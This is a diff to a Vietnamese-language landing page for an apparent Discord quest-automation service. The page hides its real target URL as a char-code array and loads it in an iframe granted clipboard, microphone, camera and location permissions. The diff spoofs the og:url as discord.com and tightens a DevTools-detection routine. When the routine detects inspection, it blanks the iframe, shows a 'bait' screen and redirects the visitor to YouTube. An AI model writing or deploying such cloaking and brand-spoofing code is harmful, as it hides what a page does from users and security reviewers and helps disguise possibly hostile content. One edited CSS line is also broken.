@@ -7,7 +7,7 @@
     <meta property="og:title" content="Discord Quests Auto" />
     <meta property="og:description" content="• Tự động thực thi nhiệm vụ và đồng bộ dữ liệu ngay cả khi đóng tab.&#10;• Vận hành ổn định trên nền tảng cloud, đảm bảo tiến độ liên tục 24/7.&#10;• Công nghệ mã hóa đa tầng, bảo vệ quyền riêng tư và an toàn tài khoản.&#10;• Tương thích hoàn hảo trên mọi nền tảng thiết bị." />
     <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://discordquestauto.space-z.ai/" />
+    <meta property="og:url" content="https://discord.com/" />
     <meta name="theme-color" content="#EB459E">
     <link rel="icon" type="image/jpeg" href="https://raw.githubusercontent.com/Kandagawa/Auto-Quests-Discord/main/f59f1e660b16370adbc1621f7907e382.jpg">
     <link rel="shortcut icon" type="image/jpeg" href="https://raw.githubusercontent.com/Kandagawa/Auto-Quests-Discord/main/f59f1e660b16370adbc1621f7907e382.jpg">
@@ -45,7 +45,7 @@
         .logo-inner{width:100px;height:100px;background:linear-gradient(145deg,var(--blurple),var(--blurple-dark));border-radius:28px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 30px var(--blurple-glow),0 8px 32px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.1);animation:logoPulse 2s ease-in-out infinite;position:relative;overflow:hidden}
         .logo-inner::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent 40%,rgba(255,255,255,.07) 50%,transparent 60%);animation:shimmer 3s ease-in-out infinite}
         @keyframes shimmer{0%,100%{transform:translateX(-100%) rotate(45deg)}50%{transform:translateX(100%) rotate(45deg)}}
-        @keyframes logoPulse{0%,100%{box-shadow:0 0 30px var(--blurple-glow),0 8px 32px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.1);transform:scale(1)}50%{box-shadow:0 0 50px var(--blurple-glow),0 8px 40px rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.15);transform:scale(1.05)}}
+        @keyframes logoPulse{0%,100%{box-shadow:0 0 30px var(--blurple-glow),0 8px 32px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.1);transform:scale(1)}50%{box-shadow:0 0 50px var(--blurple-glow),0 8px 40px rgba(0,0,0,.5);inset 0 1px 0 rgba(255,255,255,.15);transform:scale(1.05)}}
         .clyde-svg{width:56px;height:56px;fill:#fff;filter:drop-shadow(0 2px 4px rgba(0,0,0,.3));position:relative;z-index:1}
         .title-group{display:flex;flex-direction:column;align-items:center;gap:4px;opacity:0;animation:slideUp .6s .15s ease-out forwards}
         @keyframes slideUp{0%{opacity:0;transform:translateY(16px)}100%{opacity:1;transform:translateY(0)}}
@@ -76,11 +76,50 @@
         .pill:nth-child(2) .pill-dot{background:var(--green);box-shadow:0 0 6px rgba(87,242,135,.4)}
         .pill:nth-child(3) .pill-dot{background:var(--fuchsia);box-shadow:0 0 6px var(--fuchsia-glow)}
         .pill:nth-child(4) .pill-dot{background:var(--yellow);box-shadow:0 0 6px rgba(254,231,92,.4)}
-        @media(max-width:480px){.title{font-size:24px}.logo-wrapper{width:88px;height:88px}.logo-inner{width:88px;height:88px;border-radius:24px}.clyde-svg{width:48px;height:48px}.pill{font-size:10px;padding:4px 10px}#loader{gap:26px}}
+        
+        /* === MÀN HÌNH BAIT: MINIMALIST & PROFESSIONAL === */
+        #bait-screen {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.4s cubic-bezier(0.16, 1, 0.3, 1); /* Mượt mà nhưng không chói */
+        }
+        #bait-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        #bait-screen h1 {
+            font-size: 48px;
+            font-weight: 300; /* Font mỏng thanh lịch */
+            margin-bottom: 0;
+            text-align: center;
+            padding: 0 20px;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: baitSlideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; 
+        }
+
+        @keyframes baitSlideUp {
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        @media(max-width:480px){.title{font-size:24px}.logo-wrapper{width:88px;height:88px}.logo-inner{width:88px;height:88px;border-radius:24px}.clyde-svg{width:48px;height:48px}.pill{font-size:10px;padding:4px 10px}#loader{gap:26px} #bait-screen h1{font-size:32px; letter-spacing: 3px;}}
         @media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important}}
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
     <div class="bg-layer"></div>
     <div class="grid-overlay"></div>
     <div class="noise"></div>
@@ -90,6 +129,12 @@
     <div class="orb orb-3"></div>
     <div class="orb orb-4"></div>
     <iframe id="content-frame" src="about:blank" allow="clipboard-read; clipboard-write; geolocation; microphone; camera"></iframe>
+    
+    <!-- Màn hình Bait - Tối giản, chỉ 1 dòng chữ -->
+    <div id="bait-screen">
+        <h1>Chào Mừng Bạn</h1>
+    </div>
+
     <div id="loader">
         <div class="logo-wrapper">
             <div class="logo-ring"></div>
@@ -123,34 +168,49 @@
         var _0x=[104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,113,117,101,115,116,97,117,116,111,46,115,112,97,99,101,45,122,46,97,105,47];
         var target=_0x.map(function(c){return String.fromCharCode(c)}).join('');
 
-        // Hàm tự kill bản thân, ngắt iframe và chuyển hướng sang Youtube
-        var _kill=function(){
+        // Hàm Kill kiểu Bait
+        var _isKilled = false;
+        var _kill = function(){
+            if(_isKilled) return;
+            _isKilled = true;
+            
+            // 1. Dừng network và iframe ngay lập tức
             try { document.getElementById('content-frame').src = 'about:blank'; } catch(e){}
-            document.body.innerHTML='';
-            window.location.replace('https://www.youtube.com/@TenretniAifam');
+            try { window.stop(); } catch(e){}
+            
+            // 2. Ẩn cái màn hình loading Discord giả đi
+            try { document.getElementById('loader').style.display = 'none'; } catch(e){}
+            
+            // 3. Hiện màn hình chào mừng Bait
+            try { document.getElementById('bait-screen').classList.add('active'); } catch(e){}
+            
+            // 4. Đợi 2 giây cho người xem thưởng thức sự thanh lịch rồi chuyển hướng
+            setTimeout(function() {
+                try {
+                    window.location.replace('https://www.youtube.com/@TenretniAifam');
+                } catch(e){
+                    window.location.href = 'https://www.youtube.com/@TenretniAifam';
+                }
+            }, 2000); // Đổi thành 2000ms (2 giây)
         };
 
-        // 1. Chống Click chuột phải
-        document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+        // ĐÃ XÓA: Chống Click chuột phải, Chống phím tắt F12... Giờ bấm vô tư!
 
-        // 2. Chống phím tắt F12, Ctrl+Shift+I/J, Ctrl+U
-        document.onkeydown=function(e){
-            if(e.keyCode==123||(e.ctrlKey&&(e.shiftKey&&(e.keyCode==73||e.keyCode==74)||e.keyCode==85)))return false;
-        };
-
-        // 3. Phát hiện DevTool mở (cả PC và Mobile) -> Kill bản thân & Chuyển Youtube
+        // Cơ chế phát hiện DevTool mở bằng kích thước cửa sổ
         var threshold = 160;
-        var initW = window.outerWidth - window.innerWidth > threshold;
-        var initH = window.outerHeight - window.innerHeight > threshold;
-        
-        setInterval(function(){
-            var currW = window.outerWidth - window.innerWidth > threshold;
-            var currH = window.outerHeight - window.innerHeight > threshold;
-            if(currW !== initW || currH !== initH){
-                _kill(); 
+        var checkDevTool = function(){
+            if(_isKilled) return;
+            var widthDiff = window.outerWidth - window.innerWidth > threshold;
+            var heightDiff = window.outerHeight - window.innerHeight > threshold;
+            if(widthDiff || heightDiff){
+                _kill();
             }
-        }, 500);
+        };
+        
+        checkDevTool();
+        setInterval(checkDevTool, 500);
 
+        // Đoạn xử lý Particle giữ nguyên 100%
         var cv=document.getElementById('particleCanvas');
         var cx=cv.getContext('2d');
         var ps=[];
@@ -210,6 +270,7 @@
         }
 
         function loop(){
+            if(_isKilled) return;
             cx.clearRect(0,0,cv.width,cv.height);
             for(var i=0;i<ps.length;i++){ps[i].update();ps[i].draw()}
             lines();
@@ -217,6 +278,7 @@
         }
         loop();
 
+        // Đoạn chữ chạy trống status giữ nguyên 100%
         var msgs=['Đang kết nối đến máy chủ','Đang xác thực dữ liệu','Đang tải tài nguyên','Đang khởi chạy hệ thống'];
         var si=0;
         function cycle(){
@@ -231,7 +293,7 @@
             cycle();
             var frame=document.getElementById('content-frame');
             var loader=document.getElementById('loader');
-            // Gắn link trực tiếp vì đã có cơ chế kill bảo vệ
+            
             frame.src=target;
             frame.onload=function(){
                 setTimeout(function(){
